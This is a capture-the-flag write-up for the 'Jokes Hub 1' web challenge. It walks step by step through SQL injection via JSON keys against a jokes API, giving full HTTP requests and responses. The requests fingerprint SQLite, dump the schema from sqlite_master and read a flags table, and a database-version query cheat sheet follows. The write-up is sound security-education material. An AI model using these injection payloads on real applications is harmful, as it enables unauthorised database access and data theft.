# Jokes Hub 1

## Description

> Just a jokes website, to make you laugh.
> 
> https://jokes-hub-1.bsides.shellmates.club 

## Write-Up

While checking the website, here is the js code :

```js
const jokeContainer = document.getElementById("jokeContainer");
const getJokeBtn = document.getElementById("getJokeBtn");
const showPunchlineBtn = document.getElementById("showPunchlineBtn");

let jokeId;

getJokeBtn.addEventListener("click", async () => {
  try {
    jokeId = Math.floor(Math.random() * 10)+1;
    const res = await fetch('/jokes', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ joke: jokeId })
    });
    const data = await res.json();
    showPunchlineBtn.style.display = "block";
    jokeContainer.querySelector(".joke-punchline").style.display = "none";
    jokeContainer.style.display = "block";
    jokeContainer.querySelector(".joke-setup").textContent = data.result;
  } catch (err) {
    console.error(err);
  }
});

showPunchlineBtn.addEventListener("click", async () => {
  try {
    const res = await fetch('/jokes', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ punchline: jokeId })
    });
    const data = await res.json();
    jokeContainer.querySelector(".joke-punchline").textContent = data.result;
    jokeContainer.querySelector(".joke-punchline").style.display = "block";
    showPunchlineBtn.style.display = "none";
  } catch (err) {
    console.error(err);
  }
});
```

### Testing requests

Ask for a joke :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 11
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke":10}
```

Response :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 01:27:45 GMT
content-type: application/json
content-length: 51
connection: close

{"result":"Did you hear they arrested the devil?"}
```

Ask for punshline :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 16
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"punchline":10}
```

Response :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 01:28:59 GMT
content-type: application/json
content-length: 46
connection: close

{"result":"Yeah, they got him on possession"}
```

### Testing Values

1. Out of range values :

```
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke":11}
```

Result :

```
Couldn't retrieve results
```

### Testing injections

1. SQL Injection :

```
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke":"' OR 1=1 --"}
```

Result :

```
Couldn't retrieve results
```

This leads nowhere.


When seeing closely the fetch functions :

```js
...
    const res = await fetch('/jokes', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ joke: jokeId })
    });
...
    const res = await fetch('/jokes', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ punchline: jokeId })
    });
```

We can see that in the two different requests, there endpoint `/jokes` is the same. And since it is a select from a DB table, we might think that the there is a selection using `jokeId` attribute, and the column to be selected is the attribute name of the body sent.

Here is how we imagine the statement :

`SELECT joke FROM jokes WHERE id = jokeId`

And the `joke` column is where to put injection.

From here, we can try this :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke FROM jokes --":8}
```

it will give this :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 02:09:22 GMT
content-type: application/json
content-length: 55
connection: close

{"result":"Why did the chicken cross the playground?"}
```

same as this :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke FROM jokes --":3}
```

And this :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke FROM jokes --":100}
```

So, the value doesn't mean anything now.

Also, we can get this :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"punchline FROM jokes --":3}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 02:14:01 GMT
content-type: application/json
content-length: 40
connection: close

{"result":"To get to the other slide!"}
```

Moreover, we got that the name of the table is `jokes`, and there is two columns called `joke` and `punchline`.


Other tentatives :

1. multiple columns :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"joke, punchline FROM jokes --":3}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 02:14:01 GMT
content-type: application/json
content-length: 40
connection: close

{"result":"Why did the chicken cross the playground?"}
```

And

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"punchline, joke FROM jokes --":3}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 02:14:01 GMT
content-type: application/json
content-length: 40
connection: close

{"result":"To get to the other slide!"}
```

Thos also works :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"punchline, joke FROM jokes WHERE '' OR 1=1 --":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 02:14:01 GMT
content-type: application/json
content-length: 40
connection: close

{"result":"To get to the other slide!"}
```

### Getting infos about the DB

1. Get type of DB :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Connection: close

{"sqlite_version();--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 03:39:06 GMT
content-type: application/json
content-length: 20
connection: close

{"result":"3.39.3"}
```

So, it's an sqlite database.

2. get information of database table :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Accept-Language: en-US,en;q=0.9
Connection: close

{"sql FROM sqlite_master WHERE type = 'table' AND name = 'jokes';--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 03:42:58 GMT
content-type: application/json
content-length: 154
connection: close

{"result":"CREATE TABLE jokes\n                 (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                  joke TEXT,\n                  punchline TEXT)"}
```

3. Get list of tables :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Connection: close

{"name FROM sqlite_master WHERE type='table' ORDER BY name;--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 03:46:03 GMT
content-type: application/json
content-length: 19
connection: close

{"result":"flags"}
```

4. Get infos about flags table :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Connection: close

{"sql FROM sqlite_master WHERE type = 'table' AND name = 'flags';--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 03:47:19 GMT
content-type: application/json
content-length: 119
connection: close

{"result":"CREATE TABLE flags\n                 (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                  flag TEXT)"}
```

5. Get the flag :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 25
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"flag FROM flags--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 03:48:19 GMT
content-type: application/json
content-length: 49
connection: close

{"result":"shellmates{ar3_sqli_still_4_THing?}"}
```

## Flag

shellmates{ar3_sqli_still_4_THing?}

## More Information

 - https://portswigger.net/web-security/sql-injection/examining-the-database
 - here are the SQL queries to get the version of each database:

```
    MySQL:

    SELECT VERSION();

    PostgreSQL:

    SELECT version();

    Oracle:

    SELECT * FROM v$version;

    Microsoft SQL Server:

    SELECT @@VERSION;

    SQLite:

    SELECT sqlite_version();

    IBM DB2:

    SELECT * FROM SYSIBMADM.ENV_INST_INFO;

    MariaDB:

    SELECT VERSION();

    SAP HANA:

    SELECT * FROM M_DATABASE;

    Teradata:

    SELECT VERSION;

    Amazon Aurora:

    SELECT @@VERSION;
```

Note that the specific syntax and options for these queries may vary depending on the version of the database you are using. Also, keep in mind that you will need appropriate permissions to run these queries, and some databases may require additional configuration to enable access to system information.
